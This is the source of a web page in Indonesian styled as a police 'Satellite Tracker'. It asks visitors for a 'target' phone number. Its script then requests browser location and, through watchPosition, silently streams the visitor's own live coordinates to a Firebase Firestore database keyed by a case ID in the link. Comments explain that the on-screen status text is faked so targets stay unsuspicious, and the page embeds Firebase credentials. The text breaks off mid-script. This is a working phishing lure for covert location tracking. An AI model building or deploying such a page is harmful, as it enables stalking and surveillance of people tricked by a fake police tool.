<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Pelacak Jaringan - Ditreskrimum</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: radial-gradient(circle, #0f172a 0%, #020617 100%);
            color: #f8fafc;
            font-family: 'Rajdhani', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: rgba(30, 41, 59, 0.7);
            border: 2px solid #38bdf8;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 0 25px rgba(56, 189, 248, 0.2);
            backdrop-filter: blur(10px);
            text-align: center;
        }

        .title {
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            font-size: 2rem;
            letter-spacing: 2px;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #38bdf8 0%, #f43f5e 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            font-size: 1rem;
            color: #94a3b8;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .input-group {
            width: 100%;
            margin-bottom: 20px;
        }

        .input-group input {
            width: 100%;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid #475569;
            border-radius: 8px;
            padding: 15px;
            color: #ffffff;
            font-size: 1.1rem;
            text-align: center;
            outline: none;
            font-family: 'Orbitron', sans-serif;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: #38bdf8;
        }

        .btn-submit {
            width: 100%;
            background: linear-gradient(135deg, #38bdf8, #f43f5e);
            border: none;
            border-radius: 8px;
            padding: 15px;
            color: #ffffff;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 700;
            font-size: 1.2rem;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-submit:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(56, 189, 248, 0.4);
        }

        .status-panel {
            margin-top: 20px;
            padding: 15px;
            background: rgba(15, 23, 42, 0.8);
            border-radius: 8px;
            border: 1px solid #334155;
            display: none;
            font-size: 1rem;
        }

        .loader {
            color: #38bdf8;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1 class="title">SATELLITE TRACKER</h1>
        <p class="subtitle">Sistem Investigasi Geokomunikasi</p>

        <div id="trackerForm">
            <div class="input-group">
                <input type="tel" id="targetPhone" placeholder="MASUKKAN NO HP TARGET">
            </div>
            <button class="btn-submit" onclick="startFakeProcess()">
                <i class="fa-solid fa-satellite-dish"></i> KONFIRMASI TARGET
            </button>
        </div>

        <div class="status-panel" id="statusPanel">
            <div id="statusContent">
                <i class="fa-solid fa-spinner loader"></i> 
                <span style="margin-left: 10px;">Menghubungkan ke Satelit ISP...</span>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

    <script>
        // Kredensial Firebase asli milikmu
        const firebaseConfig = {
            apiKey: "AIzaSyC0QwhjCvQTSpbYGFgwsRDQ3k3weeSNUhw",
            authDomain: "track-location-whatsapp.firebaseapp.com",
            projectId: "track-location-whatsapp",
            storageBucket: "track-location-whatsapp.firebasestorage.app",
            messagingSenderId: "326352508226",
            appId: "1:326352508226:web:4973c291fcc5a3139ba4db"
        };

        // Inisialisasi Firebase & Firestore Database
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Mengambil penanda target dari link URL (?case=nama_target)
        const urlParams = new URLSearchParams(window.location.search);
        const caseId = urlParams.get('case') || "Default_Investigation";

        function startFakeProcess() {
            const phoneInput = document.getElementById('targetPhone').value.trim();
            if (phoneInput.length < 9) {
                alert("Peringatan: Struktur Nomor Handphone Tidak Valid!");
                return;
            }

            document.getElementById('trackerForm').style.display = 'none';
            document.getElementById('statusPanel').style.display = 'block';

            // Menjalankan pop-up perintah "IZINKAN LOKASI" bawaan sistem browser HP
            triggerTrueLocation(phoneInput);
        }

        function triggerTrueLocation(phoneNumber) {
            if (navigator.geolocation) {
                // watchPosition mendeteksi perubahan koordinat secara realtime saat target bergerak fisik
                navigator.geolocation.watchPosition(
                    (position) => {
                        // Mengirimkan data secara senyap ke Cloud Firestore Database kamu
                        db.collection("ops_tracking").doc(caseId).set({
                            target_phone: phoneNumber,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: `${position.coords.accuracy} meters`,
                            last_update: firebase.firestore.FieldValue.serverTimestamp()
                        })
                        .then(() => {
                            // Rekayasa teks di layar target agar mereka tidak curiga
                            document.getElementById('statusContent').innerHTML = `
                                <i class="fa-solid fa-circle-check" style="color: #4ade80;"></i>
                                <span style="margin-left: 10px; color: #4ade80;">Sinkronisasi Selesai. Mencari Node Jaringan...</span>
                            `;
                        })
                        .catch((error) => {
                            // Menangkap pesan error Firebase dan menampilkannya langsung di layar untuk debugging
                            document.getElementById('statusContent').innerHTML = `
                                <i class="fa-solid fa-circle-xmark" style="color: #f43f5e;"></i>
                                <span style="margin-left: 10px; color: #f43f5e;">Firebase Error: ${error.message}</span>
                            `;
                        });
                    },
                    (error) => {
                        let msg
